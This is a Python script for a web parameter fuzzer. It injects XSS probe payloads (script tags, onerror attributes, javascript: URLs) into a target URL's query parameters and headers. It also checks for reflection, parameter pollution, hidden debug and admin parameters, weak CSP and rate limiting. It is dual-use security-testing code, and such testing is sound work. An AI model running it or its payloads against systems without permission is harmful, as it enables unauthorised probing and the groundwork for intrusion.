import argparse
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import re
import json
import csv
import time
from collections import defaultdict

# set of various possible payloads that may be used to exploit the application
CONTEXT_PAYLOADS = {
    "html": '<script>alert("XSS")</script>',
    "attr": '" onerror="alert(1)',
    "js": '";alert(1);//',
    "css": 'body{background:url(javascript:alert(1))}',
    "url": 'javascript:alert(1)',
}

# list of common hidden parameters as well as making the reflection regex variable
COMMON_HIDDEN_PARAMS = ["debug", "test", "admin", "login", "user", "input", "data"]
REFLECTION_REGEX = re.compile(r'(?i)<script>alert\(["\']?XSS["\']?\)</script>')

# function that generates a list of test urls to test the payloads against them, and tracks it
def inject_payloads(url, payloads):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    fuzzed_urls = []

    for param in query:
        for context, payload in payloads.items():
            mod_query = query.copy()
            mod_query[param] = payload
            new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', urlencode(mod_query, doseq=True), ''))
            fuzzed_urls.append((new_url, param, context))

    return fuzzed_urls

# function that determines if the payload was reflected in the http response
def detect_reflection(response_text, payload):
    return payload in response_text or bool(REFLECTION_REGEX.search(response_text))

# function that tests if the url is susceptible to hpp
def detect_param_pollution(base_url, param):
    url1 = f"{base_url}&{param}=pollute"
    url2 = f"{base_url}&{param}=clean&{param}=pollute"
    try:
        r1 = requests.get(url1)
        r2 = requests.get(url2)
        return r1.text != r2.text
    except Exception:
        return False

# function that tries to detect the strength of the csp
def detect_csp(headers):
    csp = headers.get("Content-Security-Policy")
    return "unsafe-inline" in csp if csp else False

# function that tracks the different fuzzed responses, see how much it differs
def diff_responses(orig, mod):
    return len(set(orig.split()) ^ set(mod.split()))

# function that finds typically not visible parameters for the url to see if they may still be active
def find_hidden_params(base_url, timeout=5):
    parsed = urlparse(base_url)
    original_resp = requests.get(base_url, timeout=timeout).text
    discovered = []

    for param in COMMON_HIDDEN_PARAMS:
        test_url = base_url + f"&{param}=test"
        try:
            test_resp = requests.get(test_url, timeout=timeout).text
            if test_resp != original_resp:
                discovered.append(param)
        except:
            continue
    return discovered

# function to check if user input headers cause the same response from the http headers
def check_header_injection(base_url):
    headers = {
        "X-Custom-Test": '<script>alert("XSS")</script>',
        "X-Injected": "injected-header"
    }
    try:
        res = requests.get(base_url, headers=headers)
        return any('<script>alert("XSS")</script>' in v for v in res.headers.values())
    except:
        return False

# function that checks if there is basic rate limit rules
def detect_rate_limit(base_url):
    count = 0
    for _ in range(10):
        r = requests.get(base_url)
        if r.status_code in [429, 403]:
            return True
        count += 1
        time.sleep(0.2)
    return False

# general check for potentially malicious content in response headers
def response_header_reflection(base_url):
    res = requests.get(base_url)
    return any('<script>' in v for v in res.headers.values())

# main function in which deconstructs and reconstructs the url using payloads and uses previous functions to track the specific information displayed in the responses
def scan_fuzzer(url, json_out=None, csv_out=None):
    parsed = urlparse(url)
    base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', parsed.query, ''))

    print(f"|*| Fuzzing: {url}\n")
    test_cases = inject_payloads(url, CONTEXT_PAYLOADS)
    results = []

    for test_url, param, context in test_cases:
        try:
            r = requests.get(test_url, timeout=5)
            reflected = detect_reflection(r.text, CONTEXT_PAYLOADS[context])
            csp_unsafe = detect_csp(r.headers)
            diff = diff_responses(requests.get(url).text, r.text)
            results.append({
                "url": test_url,
                "param": param,
                "context": context,
                "reflected": reflected,
                "csp_unsafe_inline": csp_unsafe,
                "diff_score": diff
            })
        except Exception as e:
            continue

    hidden = find_hidden_params(base_url)
    polluted = [p for p in parse_qs(parsed.query) if detect_param_pollution(base_url, p)]
    header_injected = check_header_injection(base_url)
    rate_limited = detect_rate_limit(base_url)
    header_reflected = response_header_reflection(base_url)

    print("\n|+| Summary:")
    print(f" - Reflected Params: {[r['param'] for r in results if r['reflected']]}")
    print(f" - CSP Unsafe Inline: {[r['url'] for r in results if r['csp_unsafe_inline']]}")
    print(f" - Hidden Params Found: {hidden}")
    print(f" - Param Pollution Detected: {polluted}")
    print(f" - Header Injection Detected: {header_injected}")
    print(f" - Rate Limiting Detected: {rate_limited}")
    print(f" - Response Header Reflection: {header_reflected}")

# if loops to save results into json or csv formats
    if json_out:
        with open(json_out, "w") as jf:
            json.dump({
                "results": results,
                "hidden_parameters": hidden,
                "param_pollution": polluted,
                "header_injection": header_injected,
                "rate_limit": rate_limited,
                "header_reflection": header_reflected
            }, jf, indent=2)
        print(f"|*| JSON output saved to {json_out}")

    if csv_out:
        with open(csv_out, "w", newline='') as cf:
            writer = csv.writer(cf)
            writer.writerow(["URL", "Param", "Context", "Reflected", "CSP Unsafe", "Diff Score"])
            for r in results:
                writer.writerow([r['url'], r['param'], r['context'], r['reflected'], r['csp_unsafe_inline'], r['diff_score']])
        print(f"|*| CSV output saved to {csv_out}")

# main function called, arg parser for cli customizability
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced Parameter Fuzzer with Context-Aware Payloads and Detection Features")
    parser.add_argument("url", help="Target URL with query parameters")
    parser.add_argument("--json-output", help="Export findings to JSON file")
    parser.add_argument("--csv-output", help="Export findings to CSV file")
    args = parser.parse_args()

    scan_fuzzer(args.url, json_out=args.json_output, csv_out=args.csv_output)
